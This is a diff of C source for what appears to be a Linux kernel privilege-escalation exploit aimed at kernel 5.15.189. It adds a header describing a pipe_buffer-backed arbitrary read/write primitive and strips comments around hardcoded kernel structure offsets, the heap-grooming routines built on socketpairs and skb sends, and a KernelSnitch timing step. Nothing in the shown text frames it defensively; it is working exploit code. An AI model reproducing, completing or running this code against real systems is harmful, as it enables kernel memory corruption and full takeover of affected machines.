@@ -1,3 +1,8 @@
+/*
+ * Establishes a pipe_buffer-backed read/write path for direct-map addresses.
+ * Reclaims pipe metadata, identifies a victim buffer, proves read/write
+ * access, and maintains pipe resources.
+ */
 #define _GNU_SOURCE
 
 #include <errno.h>
@@ -82,10 +87,6 @@ void kernelsnitch_set_profile(struct kernelsnitch_shared_state *ks,
 #define OSS_KMALLOC_CACHES_OFF 0x02064478ULL
 #define OSS_ANON_PIPE_BUF_OPS_OFF 0x01e7f460ULL
 
-/* Deterministic pipe_buffer resolution (Tier 2), offsets derived from
- * device-afzh3/vmlinux.btf via pahole for kernel 5.15.189. Walk:
- * init_task.tasks -> task(pid) -> files -> fdt -> fd[pipe] ->
- * file.private_data (pipe_inode_info) -> bufs[tail & (ring_size-1)].page. */
 #define OSS_INIT_TASK_OFF 0x02c05080ULL  /* &init_task from kernel_base */
 #define OSS_TASK_TASKS_OFF 0x4d0ULL      /* task_struct.tasks (list_head) */
 #define OSS_TASK_PID_OFF 0x5d8ULL        /* task_struct.pid */
@@ -460,8 +461,6 @@ static int send_skb(int sock, void *buffer) {
   return sendmsg(sock, &msg, 0) == (ssize_t)OSS_SKB_SEND_SIZE;
 }
 
-/* FUN_00107dd4: second order-3 mm_struct reclaim, with 240 drain pipes and
- * 240 reclaim pipes. Runs inside the long-lived holder child. */
 static void set_prepare_progress(struct pipe_prepare_progress *progress,
                                  enum pipe_prepare_stage stage) {
   uint64_t now_ms = monotonic_ms();
@@ -497,8 +496,6 @@ static void log_prepare_telemetry(struct pipe_prepare_progress *progress,
                                    : 0));
 }
 
-/* Experiment knob shared with 05_mm_slab_grooming.c: KernelSnitch measurement repeat and
- * appended-futex counts, env-gated, defaults preserve the closed profile. */
 static long pipe_env_long_clamped(const char *name, long fallback, long lo,
                                   long hi) {
   const char *raw = getenv(name);
@@ -591,9 +588,7 @@ static uint64_t prepare_pipe_page_child(
     goto out;
   }
   memset(skb, 0x50, OSS_SKB_SEND_SIZE);
-  /* FUN_00107dd4 allocates the reclaim pair first and the PCP priming pair
-   * second. Preserve that socket-allocation order: it affects the allocator
-   * state immediately before the order-3 reclaim. */
+
   set_prepare_progress(progress, PIPE_STAGE_SOCKET_RECLAIM);
   if (socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim) != 0 ||
       socketpair(AF_UNIX, SOCK_STREAM, 0, pcp) != 0 ||
